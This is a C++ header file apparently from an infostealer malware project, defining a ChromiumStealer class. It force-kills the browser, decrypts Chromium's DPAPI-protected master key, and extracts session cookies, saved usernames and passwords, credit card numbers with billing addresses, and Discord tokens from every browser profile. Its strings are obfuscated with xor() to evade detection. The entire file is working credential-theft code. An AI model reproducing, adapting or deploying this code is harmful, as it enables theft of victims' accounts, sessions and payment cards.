#pragma once


#include "../crypto.hpp"
#include "../result.hpp"
#include "../util.hpp"
#include "base.hpp"
#include <sqlite3.h>
#include <nlohmann/json.hpp>

class ChromiumStealer : public AbstractStealer {
public:
    ChromiumStealer(std::string executable, std::filesystem::path path, bool discord = false)
        : path_(path), discord_(discord) {
        hidden_system(va(xor("taskkill /IM %s /F >nul 2>&1"), executable.c_str()).c_str());
    }

    void steal() override {

        {
            std::string data;
            if (read_binary_file(path_ / xor("Local State"), data) != 0)
                return;

            json local_state = json::parse(data, nullptr, false);
            if (local_state.is_discarded()) return;

            auto os_crypt = local_state.find(xor("os_crypt"));
            if (os_crypt == local_state.end()) return;

            auto enc_key_it = os_crypt->find(xor("encrypted_key"));
            if (enc_key_it == os_crypt->end()) return;

            std::string master_key_encoded = enc_key_it->get<std::string>();
            std::string decoded = crypto::base64_decode_str(master_key_encoded);


            if (decoded.size() <= 5) return;
            std::string dpapi_blob = decoded.substr(5);

            if (crypt_unprotect_data(dpapi_blob, master_key_) != 0)
                return;
        }
        PRINTF("Got master key\n");

        constexpr const char* profiles[] = {
            "", "Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4",
            "Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"
        };

        for (const auto& profile : profiles) {
            std::filesystem::path profile_path = strlen(profile) ? path_ / profile : path_;
            if (!std::filesystem::exists(profile_path)) continue;

            if (discord_) {
                extract_discord_tokens(profile_path);
                continue;
            }


            extract_cookies(profile_path);

            extract_logins(profile_path);

            extract_cards(profile_path);

            extract_discord_tokens(profile_path);
        }
    }

private:
    std::filesystem::path path_;
    std::string master_key_;
    bool discord_;

    std::string decrypt_value(const uint8_t* data, size_t size) {
        return crypto::decrypt_chromium_blob(
            (const uint8_t*)master_key_.data(), master_key_.size(), data, size);
    }

    void extract_cookies(const std::filesystem::path& profile_path) {
        auto cookies_path = profile_path / "Network" / xor("Cookies");
        if (!std::filesystem::exists(cookies_path)) return;

        sqlite3* db;
        if (sqlite3_open(cookies_path.string().c_str(), &db) != SQLITE_OK) return;

        sqlite3_stmt* stmt;
        sqlite3_prepare_v2(db, xor("SELECT host_key, name, encrypted_value FROM cookies WHERE encrypted_value IS NOT NULL ORDER BY host_key"),
                           -1, &stmt, nullptr);

        while (sqlite3_step(stmt) == SQLITE_ROW) {
            Cookie cookie;
            cookie.host = (const char*)sqlite3_column_text(stmt, 0);
            cookie.name = (const char*)sqlite3_column_text(stmt, 1);
            const uint8_t* blob = (const uint8_t*)sqlite3_column_blob(stmt, 2);
            if (!blob) continue;
            cookie.value = decrypt_value(blob, sqlite3_column_bytes(stmt, 2));
            cookies.push_back(std::move(cookie));
        }

        sqlite3_finalize(stmt);
        sqlite3_close(db);
    }

    void extract_logins(const std::filesystem::path& profile_path) {
        auto login_path = profile_path / xor("Login Data");
        if (!std::filesystem::exists(login_path)) return;

        sqlite3* db;
        if (sqlite3_open(login_path.string().c_str(), &db) != SQLITE_OK) return;

        sqlite3_stmt* stmt;
        sqlite3_prepare_v2(db, xor("SELECT origin_url, username_value, password_value FROM logins"),
                           -1, &stmt, nullptr);

        while (sqlite3_step(stmt) == SQLITE_ROW) {
            Login login;
            login.website = (const char*)sqlite3_column_text(stmt, 0);
            login.username = (const char*)sqlite3_column_text(stmt, 1);
            const uint8_t* blob = (const uint8_t*)sqlite3_column_blob(stmt, 2);
            if (!blob) continue;
            login.password = decrypt_value(blob, sqlite3_column_bytes(stmt, 2));
            logins.push_back(std::move(login));
        }

        sqlite3_finalize(stmt);
        sqlite3_close(db);
    }

    void extract_cards(const std::filesystem::path& profile_path) {
        auto web_data_path = profile_path / xor("Web Data");
        if (!std::filesystem::exists(web_data_path)) return;

        sqlite3* db;
        if (sqlite3_open(web_data_path.string().c_str(), &db) != SQLITE_OK) return;

        sqlite3_stmt* stmt;
        sqlite3_prepare_v2(db,
            xor("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id FROM credit_cards"),
            -1, &stmt, nullptr);

        while (sqlite3_step(stmt) == SQLITE_ROW) {
            CreditCard card;
            auto name_ptr = (const char*)sqlite3_column_text(stmt, 0);
            card.name = name_ptr ? name_ptr : "";
            card.expiration = va(xor("%d/%d"), sqlite3_column_int(stmt, 1), sqlite3_column_int(stmt, 2));

            const uint8_t* blob = (const uint8_t*)sqlite3_column_blob(stmt, 3);
            if (!blob) continue;
            card.number = decrypt_value(blob, sqlite3_column_bytes(stmt, 3));

            auto billing_ptr = (const char*)sqlite3_column_text(stmt, 4);
            std::string billing_id = billing_ptr ? billing_ptr : "";
            if (!billing_id.empty()) {
                sqlite3_stmt* stmt2;
                sqlite3_prepare_v2(db,
                    va(xor("SELECT type, value FROM local_addresses_type_tokens WHERE guid = '%s'"),
                       billing_id.c_str()).c_str(),
                    -1, &stmt2, nullptr);
                while (sqlite3_step(stmt2) == SQLITE_ROW) {
                    auto val = (const char*)sqlite3_column_text(stmt2, 1);
                    std::string value = val ? val : "";
                    switch (sqlite3_column_int(stmt2, 0)) {
                    case 33: card.city = value; break;
                    case 34: card.state = value; break;
                    case 35: card.zip = value; break;
                    case 36: card.country = value; break;
                    case 77: card.street = value; break;
                    }
                }
                sqlite3_finalize(stmt2);
            }

            cards.push_back(std::move(card));
        }

        sqlite3_finalize(stmt);
        sqlite3_close(db);
    }

    void extract_discord_tokens(const std::filesystem::path& profile_path) {
        auto level_db_path = profile_path / xor("Local Storage") / xor("leveldb");
        if (!std::filesystem::exists(level_db_path)) return;

        for (const auto& entry : std::filesystem::directory_iterator(level_db_path)) {
            auto ext = entry.path().extension().string();
            if (ext != xor(".ldb") && ext != xor(".log")) continue;

            std::string content;
            if (read_binary_file(entry.path(), content) != 0) continue;


            if (discord_) {
                for (size_t pos = 0; (pos = content.find(xor("dQw4w9WgXcQ:"), pos)) != std::string::npos; pos++) {
                    size_t end_pos = content.find('"', pos);
                    if (end_pos == std::string::npos) continue;
                    std::string token_b64 = content.substr(pos + 12, end_pos - pos - 12);
                    std::string decoded = crypto::base64_decode_str(token_b64);
                    if (decoded.size() >= 3 + 12 + 16) {
                        std::string decrypted = decrypt_value((const uint8_t*)decoded.c_str(), decoded.size());
                        if (!decrypted.empty())
                            append_discord_token(decrypted);
                    }
                }
            }


            for (size_t i = 0; i + 32 < content.size(); ++i) {
                if (content[i + 24] != '.' || content[i + 31] != '.') continue;
                if (!std::all_of(content.begin() + i, content.begin() + i + 31,
                    [](char c) { return (c >= '0' && c <= 'z') || c == '.'; }))
                    continue;
                size_t end = i + 32;
                while (end < content.size() && content[end] >= '0' && content[end] <= 'z') ++end;
                append_discord_token(content.substr(i, end - i));
            }
        }
    }
};
